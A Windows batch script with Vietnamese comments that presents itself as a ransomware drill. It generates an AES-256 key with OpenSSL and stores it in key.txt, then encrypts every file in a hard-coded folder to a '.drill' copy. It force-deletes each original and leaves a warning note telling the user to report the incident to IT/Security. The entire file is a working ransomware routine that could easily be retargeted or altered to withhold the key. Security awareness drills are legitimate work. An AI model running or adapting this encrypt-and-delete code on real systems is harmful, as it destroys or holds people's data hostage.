@echo off
setlocal enabledelayedexpansion

:: --- CÀI ĐẶT ---
set KEY_FILE=key.txt
set "RANSOM_NOTE=_FILES_ENCRYPTED_.txt"
set EXTENSION=.drill

:: Kiểm tra xem OpenSSL đã được cài đặt chưa
where openssl >nul 2>nul
if %errorlevel% neq 0 (
    echo [LOI] OpenSSL khong duoc tim thay. Vui long cai dat OpenSSL va them vao bien PATH.
    pause
    exit /b 1
)

:: Cung cấp thư mục đích 
set "TARGET_DIR=D:\NamTN\2025\Ransomware drill\Ransomware\Encrypt"
if not exist "%TARGET_DIR%\" (
    echo [LOI] Thu muc "%TARGET_DIR%" khong ton tai.
    pause
    exit /b 1
)

:: Kiểm tra xem thư mục đã bị mã hóa chưa
echo [INFO] Kiem tra trang thai thu muc...
dir /s /b "%TARGET_DIR%\*%EXTENSION%" >nul 2>nul
if %errorlevel% equ 0 (
    echo [CANH BAO] Da tim thay file da ma hoa ^(duoi %EXTENSION%^) trong thu muc.
    echo Script se khong thuc hien de tranh ma hoa lai du lieu.
    pause
    exit /b 0
)
echo [INFO] Thu muc chua bi ma hoa. Bat dau qua trinh...
echo.
:: =======================================================

:: Chuyển đến thư mục đích
pushd "%TARGET_DIR%"

:: 1. Tạo key ngẫu nhiên và lưu vào key.txt
echo [INFO] Dang tao key ma hoa...
openssl rand -base64 32 > %KEY_FILE%
set /p key=< %KEY_FILE%
echo [INFO] Da tao key va luu vao file: %KEY_FILE%

:: 2. Mã hóa file và 3. Xóa file gốc
echo [INFO] Bat dau qua trinh ma hoa...
for /r "%TARGET_DIR%" %%F in (*) do (
    set "filename=%%~nxF"
    set "extension=%%~xF"
    
    if /i not "%%~fF"=="%~f0" (
        if /i not "!filename!"=="%KEY_FILE%" (
            if /i not "!filename!"=="%RANSOM_NOTE%" (
                if /i not "!extension!"=="%EXTENSION%" (
                    openssl enc -aes-256-cbc -salt -in "%%F" -out "%%F%EXTENSION%" -pass pass:!key! -pbkdf2
                    
                    if !errorlevel! equ 0 (
                        del /F /Q "%%F"
                    ) else (
                        echo [LOI] Ma hoa file "%%F" that bai.
                    )
                )
            )
        )
    )
)

:: 4. Tạo file text cảnh báo
echo [INFO] Dang tao file canh bao...
(
    echo @@@ CANH BAO QUAN TRONG @@@
    echo.
    echo Tat ca cac file quan trong cua ban trong thu muc %TARGET_DIR% da bi MA HOA.
    echo De khoi phuc lai file, ban can key giai ma duy nhat.
    echo.
    echo Day la mot phan cua DIEN TAP RANSOMWARE.
    echo Neu day la tinh huong thuc, ban se duoc yeu cau tra tien chuoc.
    echo.
    echo Vui long bao cao su co nay cho doi ngu IT/Security cua ban ngay lap tuc.
) > %RANSOM_NOTE%

echo.
echo [HOAN TAT] Qua trinh ma hoa da hoan thanh.
popd
pause